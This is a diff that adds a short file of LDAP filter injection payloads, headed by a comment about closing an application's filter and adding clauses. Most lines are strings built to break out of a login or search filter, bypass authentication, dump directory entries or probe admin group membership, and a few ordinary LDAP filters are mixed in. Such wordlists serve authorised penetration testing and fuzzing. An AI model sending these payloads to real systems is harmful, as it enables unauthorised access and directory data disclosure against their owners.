@@ -1,0 +1,19 @@
+# LDAP filter injection: closing the application's filter and adding clauses.
+(&(uid=admin)(!(&(1=0)(userPassword=q))))
+*(|(objectclass=*))
+userPassword:2.5.13.18:=123
+admin)(&)
+admin)(uid=*))(|(uid=*
+*)(uid=*))(|(uid=*
+*)(objectclass=*
+x)(|(cn=*
+cn:dn:=admin
+(|(uid=a)(uid=b))
+uid=*)(|(password=*)
+jsmith)(!(uid=
+*)(|(mail=*
+admin)(|(objectclass=*)
+*)(&(objectclass=user)
+)(cn=*))(&(cn=*
+sn:caseExactMatch:=Smith
+*)(memberof=cn=admins,dc=example,dc=com
